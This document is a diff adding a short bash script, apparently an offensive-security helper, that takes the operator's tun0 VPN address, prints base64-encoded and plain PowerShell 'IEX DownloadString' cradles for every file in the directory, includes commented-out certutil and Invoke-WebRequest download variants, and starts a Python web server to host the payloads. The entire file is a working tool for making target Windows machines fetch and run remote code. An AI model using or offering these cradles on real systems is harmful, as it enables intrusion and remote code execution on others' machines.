@@ -1,0 +1,14 @@
+#!/bin/bash
+#pwed = powershell web
+tun0=$(/sbin/ifconfig tun0 | grep 'inet' | head -1 | awk '{print $2}')
+port=9000
+for f in *; do
+	echo powershell -EncodedCommand $(echo -n "IEX (New-Object Net.WebClient).DownloadString('http://$tun0:$port/$f')" | iconv  -t UTF-16LE | base64 -w0)
+	echo "IEX (New-Object Net.WebClient).DownloadString('http://$tun0:$port/$f')"
+	echo '--'
+#	echo "invoke-webrequest -Uri http://$tun0:$port/$f -OutFile $f"
+#	echo Invoke-WebRequest http://$tun0:$port/$f -OutFile $f
+#	echo certutil -urlcache -split -f \"http://$tun0:$port/$f\" \"$f\"
+done
+
+python -m SimpleHTTPServer $port
